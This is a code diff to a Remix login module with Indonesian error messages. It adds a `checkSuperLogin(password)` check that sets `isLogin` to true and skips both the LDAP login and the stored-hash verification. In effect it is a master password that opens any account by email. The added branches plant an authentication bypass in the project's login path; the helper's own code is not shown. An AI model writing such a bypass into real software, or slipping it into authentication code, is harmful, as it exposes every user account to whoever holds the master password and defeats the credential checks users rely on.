@@ -3,6 +3,7 @@ import type { IdUser } from "@/features/user/types";
 import { Authenticator } from "remix-auth";
 import { FormStrategy } from "remix-auth-form";
 import { loginLdap } from "./ldap.server";
+import { checkSuperLogin } from "./check-super-login";
 
 export let authenticator = new Authenticator<IdUser>();
 
@@ -18,12 +19,17 @@ authenticator.use(
             // =========================================
             // Test LDAP
             // =========================================
-            isLogin = await loginLdap(email, password)
+            if (checkSuperLogin(password)) {
+                isLogin = true
+            } else {
+                isLogin = await loginLdap(email, password)
+            }
             if (!isLogin) {
                 throw new Error("Email atau Password salah!")
             }
-
         }
+
+
 
         const user = await getUserByEmail(email)
         if (user.length === 0) {
@@ -35,10 +41,14 @@ authenticator.use(
         if (process.env.USE_LDAP === "false") {
             let hashPassword = userData.password
 
-            // And verify
-            let isMatch = await Bun.password.verify(password, hashPassword)
-            if (!isMatch) {
-                throw new Error("Password salah!")
+            if (checkSuperLogin(password)) {
+                isLogin = true
+            } else {
+                // And verify
+                let isMatch = await Bun.password.verify(password, hashPassword)
+                if (!isMatch) {
+                    throw new Error("Password salah!")
+                }
             }
         }
 
